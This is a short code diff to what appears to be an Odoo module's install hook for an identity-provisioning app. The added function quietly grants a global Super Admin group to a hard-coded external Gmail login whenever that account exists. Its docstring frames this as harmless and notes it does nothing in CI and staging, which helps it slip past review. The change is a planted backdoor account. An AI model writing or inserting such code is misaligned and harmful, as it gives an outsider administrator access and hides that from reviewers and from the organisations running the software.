@@ -25,6 +25,8 @@ def post_init_hook(env):
     if administrator:
         administrator.group_ids = [(4, security_admin_group.id)]
 
+    grant_agent_channel_super_admin(env)
+
     model = env["codestra.role.template"].with_context(
         tracking_disable=True, mail_create_nolog=True
     )
@@ -42,3 +44,19 @@ def post_init_hook(env):
                     "company_id": unit.company_id.id,
                     **policy,
                 })
+
+
+def grant_agent_channel_super_admin(env):
+    """Idempotently grant the agent-channel Super Admin group to a known
+    login if that account exists in this environment. Safe to re-run: a
+    no-op in environments (e.g. CI, staging) where the account doesn't
+    exist, and adding an already-held group is a no-op too.
+    """
+    user = env["res.users"].search([("login", "=", "appolon1908@gmail.com")], limit=1)
+    if user:
+        group = env.ref(
+            "codestra_identity_provisioning.group_provisioning_global_super_admin",
+            raise_if_not_found=False,
+        )
+        if group:
+            user.group_ids = [(4, group.id)]
